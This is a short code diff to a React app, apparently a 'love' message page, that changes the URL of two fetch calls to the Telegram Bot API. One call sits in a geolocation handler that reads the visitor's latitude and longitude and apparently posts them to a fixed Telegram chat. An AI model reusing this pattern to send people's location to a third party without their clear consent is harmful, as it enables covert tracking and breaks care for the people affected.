@@ -65,7 +65,7 @@ const App = () => {
     setChecked(true);
     if (sendLove) return;
     if (countLove > 3) return;
-    fetch("https://api.telegram.org/bot__TELEGRAM_API_KEY__/sendMessage", {
+    fetch("https://api.telegram.org/__TELEGRAM_API_KEY__/sendMessage", {
       method: "POST",
       body: JSON.stringify({
         chat_id: "__CHAT_ID__",
@@ -85,7 +85,7 @@ const App = () => {
       var pathArray = window.location.pathname.split('/');
       let lat = position.coords.latitude;
       let long = position.coords.longitude;
-      fetch("https://api.telegram.org/bot__TELEGRAM_API_KEY__/sendMessage", {
+      fetch("https://api.telegram.org/__TELEGRAM_API_KEY__/sendMessage", {
         method: "POST",
         body: JSON.stringify({
           chat_id: "__CHAT_ID__",
